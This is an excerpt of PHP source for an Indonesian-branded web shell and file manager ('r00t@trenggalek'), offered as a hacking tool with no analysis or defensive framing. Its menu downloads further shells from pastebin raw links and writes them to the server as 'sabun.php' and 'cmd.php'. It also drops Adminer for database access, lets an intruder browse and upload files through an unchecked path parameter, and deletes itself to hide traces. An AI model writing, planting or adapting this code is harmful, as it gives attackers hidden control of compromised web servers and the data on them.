...
<html>
<head>
<title>r00t@trenggalek:~$</title>
<link rel="icon" type="image/png" href="https://cdn4.iconfinder.com/data/icons/proglyphs-signs-and-symbols/512/Poison-512.png">
</head>';
...
<tr><td>
<font color="#00ff00"><center>'.php_uname().'</center></font><br>';
 
echo '<center><font color="white"><il>-<a href="?" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> Home </a></il>';
echo '<il>- <a href="?jembot=sabun" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> Sabun </a></il>'; 
echo '<il>- <a href="?jembot=cmd" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> CMD </a></il>';
echo '<il>- <a href="?jembot=mysql" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> MySQL </a></il>';
echo '<il>- <a href="?jembot=about" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> About </a></il>';
echo '<il>- <a href="?jembot=deleteme" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> Bunuh Diri </a>-</il></font></center><br>'; 
#### TOOLS HERE ####
if (isset($_GET["jembot"])&&$_GET["jembot"]=='sabun') {
	$link = 'https://pastebin.com/raw/FKu1d0tW';
	$page = file_get_contents($link);
	$file = 'sabun.php';
	$handle = fopen($file,"w+");
	fwrite($handle, $page);
	echo "<center><a href='$file' target='_blank' style='text-decoration: none;'>Click Here => $file</a></center><br><br>";
	fclose($handle);
}
if (isset($_GET["jembot"])&&$_GET["jembot"]=='cmd') { 
	$link = 'https://pastebin.com/raw/jk8SQEgr'; 
	$page = file_get_contents($link); 
	$file = 'cmd.php'; 
	$handle = fopen($file,"w+"); 
	fwrite($handle, $page); 
...
if (isset($_GET["jembot"])&&$_GET["jembot"]=='mysql') { 
	$link = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php'; 
	$page = file_get_contents($link); 
	$file = 'db.php'; 
	$handle = fopen($file,"w+");
	fwrite($handle, $page); 
...
if (isset($_GET['jembot']) && ($_GET['jembot']== 'deleteme')) {
	unlink(__FILE__);
	echo "<script>window.location='./';</script>";
}
if (isset($_GET['jembot']) && ($_GET['jembot']== 'about')){
	
	echo "
		<center><h4>↙Information↘</h4>
		<p><i>Filemanager By Ustadcage_48 - Moded by wong galek</i></p></center>";
}
#### END TOOLS ####
if(isset($_GET['path'])){
$path = $_GET['path'];
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#fff><center>$ r00t@trenggalek:~$ <a href="?path=/" style="text-decoration:none;">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '<font color="#00ff00">Upload Berhasil...</font><br />';
}else{
...
echo "
<tr>
<td class=td_home> <a href=\"?path=$path/$dir\" style=\"text-decoration:none;\">$dir</a></td>
...
echo "<tr>
<td class=td_home > <a href=\"?filesrc=$path/$file&path=$path\" style=\"text-decoration:none;\">$file</a></td>
...
echo '<br><pre><center><a href="http://www.trenggalek6etar.id" target="_blank" font size="5" color="red">Trenggalek6etar.ID</center></font></pre></body>
</html>';
function perms($file){
